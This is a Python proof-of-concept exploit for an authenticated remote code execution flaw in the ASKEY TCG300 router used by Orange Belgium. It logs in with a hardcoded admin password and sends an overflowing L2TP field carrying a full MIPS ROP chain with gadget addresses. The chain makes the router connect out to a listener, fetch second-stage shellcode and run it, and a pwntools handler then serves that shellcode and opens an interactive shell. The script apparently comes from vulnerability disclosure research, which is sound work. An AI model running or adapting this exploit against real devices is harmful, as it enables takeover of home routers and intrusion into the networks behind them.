#!/usr/bin/env python3
'''
This script demonstrates an authenticated remote code execution flaw
affecting ASKEY TCG300 (aka Siligence TCG300) deployed by Orange Belgium.

Upon exploitation, the device will connect to 192.168.22.2:2049 to pull
a second stage payload (removed here).

Author: Quentin Kaiser <quentin@ecos.wtf>
'''
import string
import requests
import re
from requests.auth import HTTPBasicAuth
import sys
import struct
from pwn import *
from threading import Thread

def handler():
    with open('rop_stage2.bin', 'rb') as f:
        shellcode = f.read()

    l = listen(2049, '0.0.0.0')
    c = l.wait_for_connection()
    print("[+] Got connection. Sending payload.")
    l.sendline(shellcode)
    l.interactive()

def pad(length):
    return randoms(length).encode('utf-8')

def build_payload():

    context.endian = 'big'

    debug_addr = 0x99999999
    hardcoded_afinet = 0x81916fd8 # tcp/2049
    socket_addr = 0x80e936d0
    connect_addr = 0x80e93abc
    recv_addr = 0x80e9418c
    sleep_addr = 0x80e90608

    sockfd_addr = 0x86705fd0
    sockaddr_addr = 0x867dade4 # IkeThread stack address
    payload_buffer_addr = 0x867dade4 + 0x64

    payload = b""
    payload += pad(314)

    # -------------------------------------
    # socket(2, 1, 0)
    # -------------------------------------
    payload += p32(0x80dea1c8)
    # 0x80dea1c8: addiu $a0, $zero, 2; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(8)
    payload += p32(0x80f20198)
    # 0x80f20198: addiu $a1, $zero, 1; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(0xc)
    payload += p32(0x80e65808)
    # 0x80e65808: move $a2, $zero; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += p32(socket_addr)
    payload += p32(socket_addr)
    payload += p32(socket_addr)
    payload += p32(0x80737ea4)
    # 0x80737ea4: lw $v0, 4($sp); lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;

    payload += pad(0x10)
    payload += p32(socket_addr)
    payload += pad(0x8)
    payload += p32(0x80d9fd2c)
    # 0x80d9fd2c: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    # ---------------------------------------
    # connect(sockfd, sockaddr_in, socklen)
    # ---------------------------------------

    payload += pad(0x10)
    payload += p32(0x800669e4)
    # 0x800669e4: lw $ra, 4($sp); lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(0x8)
    payload += p32(sockfd_addr - 0x4) # $s0
    payload += p32(0x80bf878c) # $ra
    # 0x80bf878c: sw $v0, 4($s0); lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(0xc)
    payload += p32(0x80cf6080)
    # 0x80cf6080:  move $a0, $v0; lw $ra, ($sp); move $v0, $a0; jr $ra; addiu $sp, $sp, 0x10;
    payload += pad(0x8)


    payload += p32(0x80e4d5c4)
    # 0x80e4d5c4: lw $a2, ($sp); lw $ra, 0x18($sp); lw $s1, 0x14($sp); lw $s0, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;
    payload += pad(0xc)
    payload += p32(0x20202020)          # $a2
    payload += pad(0xc)
    payload += p32(hardcoded_afinet)    # $s0
    payload += p32(sockaddr_addr)       # $s1

    payload += p32(0x80e06398)
    # load value from hardcoded_afinet ($s0) into $v0
    # 0x80e06398: lw $v0, ($s0); lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(0x8)
    payload += p32(0x80865478)
    # store value from $v0 (hardcoded_afinet) into address $s1 (sockaddr_addr)
    # 0x80865478: sw $v0, ($s1); lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;


    payload += pad(0xc)
    payload += p32(sockaddr_addr + 0x04) # sockaddr_addr + offset to put IP
    payload += p32(0x80e341cc)
    # 0x80e341cc: lw $v0, ($sp); lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;
    payload += pad(0x4)
    payload += struct.pack('>BBBB', 192, 168, 22, 2)

    #--works--
    payload += pad(0xc)
    # 0x80865478: sw $v0, ($s1); lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
    payload += p32(0x80865478)
    payload += pad(0xc)
    payload += p32(sockaddr_addr) #$s1
    payload += p32(sockaddr_addr) # $s0

    payload += p32(0x8030c73c)
    # 0x8030c73c: move $a1, $s0; andi $v0, $v0, 0xff; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;'))

    payload += pad(0x8)
    payload += p32(0x80737ea4)
    # 0x80737ea4: lw $v0, 4($sp); lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;
    payload += pad(0xc)
    payload += p32(connect_addr)
    payload += pad(0x8)
    payload += p32(0x80d9fd2c)
    # 0x80d9fd2c: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    # ----------------------------------------------------
    # recv(int sockfd, void *buf, size_t len, int flags);
    # ----------------------------------------------------

    payload += pad(0x10)
    payload += p32(0x8082df90)
    # 0x8082df90: lw $a1, 4($sp); lw $ra, 0x14($sp); lw $s0, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;

    payload += pad(0xc)
    payload += p32(payload_buffer_addr)

    #payload += pad(0x8)
    payload += pad(0xc)
    payload += p32(0x80b6ff18)
    # 0x80b6ff18: addiu $a2, $zero, 0x400; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(0xc)
    payload += p32(0x80f10f24)
    # 0x80f10f24: move $a3, $zero; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(0x8)
    payload += p32(0x800741cc)
    # 0x800741cc: nop; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
    payload += pad(0xc)
    payload += p32(sockfd_addr)  # $s0
    payload += pad(0x4)         # $s1
    payload += p32(0x80dd01d4)  # $ra
    # 0x80dd01d4: lw $a0, ($s0); lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(0xc)
    payload += p32(0x80737ea4) # $ra
    # 0x80737ea4: lw $v0, 4($sp); lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;

    payload += pad(0x8)
    payload += p32(recv_addr)

    payload += pad(0x8)
    payload += p32(0x80d9fd2c)
    # 0x80d9fd2c: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
    # call recv($a0, $a1, $a2, $a3)

    # ----------------------------------------
    # sleep(2)
    # ----------------------------------------

    payload += pad(0x10)
    payload += p32(0x80dea1c8)
    # 0x80dea1c8: addiu $a0, $zero, 2; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(0x8)
    payload += p32(0x80737ea4)
    # 0x80737ea4: lw $v0, 4($sp); lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;'))

    payload += pad(0x10)
    payload += p32(sleep_addr)

    payload += pad(0x8)
    payload += p32(0x80d9fd2c)
    # 0x80d9fd2c: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    # ------------------------------------------
    # jump to shellcode
    # ------------------------------------------

    payload += pad(0x10)
    payload += p32(0x80737ea4)
    # 0x80737ea4: lw $v0, 4($sp); lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;
    payload += pad(0xc)
    payload += p32(payload_buffer_addr)

    payload += pad(0x8)
    payload += p32(0x80d9fd2c)
    # 0x80d9fd2c: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;'))

    payload += pad(0xc)
    payload += p32(payload_buffer_addr)
    payload += p32(payload_buffer_addr)
    # --- At this point, we're executing the received payload from the remote server
    return payload

def login(username="admin", password="cnEv5fuV"):
    response = requests.post(
        "http://192.168.0.1/goform/AskLogin",
        data = {
            "AskUsername":username,
            "AskPassword":password
        },
        allow_redirects=False
    )
    return response.headers['Location'] == "/overview.asp"

def exploit():
    try:
        requests.post(
            "http://192.168.0.1/goform/AskVPNL2TP",
            data={
                "PPPStartIp0":10,
                "PPPStartIp1":0,
                "PPPStartIp2":0,
                "PPPStartIp3":1,
                "PPPEndIp0":10,
                "PPPEndIp1":0,
                "PPPEndIp2":0,
                "PPPEndIp3":254,
                "AskMPPEValue":1,
                "AskVPNIPSecValue":0,
                "L2TPuser2":build_payload(),
                "L2TPPassword0":"A",
                "L2TPPresharedPhrase":"A"
            },
            allow_redirects=False,
            timeout=2
        )
    except Exception as e:
        # handle inevitable timeout
        return

if __name__ == "__main__":

    if login():
        print("[+] Login successful.")
        print("[+] Launching reverse shell handler.")
        handlerthr = Thread(target=handler)
        handlerthr.start()
        print("[+] Sending exploit payload.")
        exploit()
    else:
        print("[!] An error occured.")
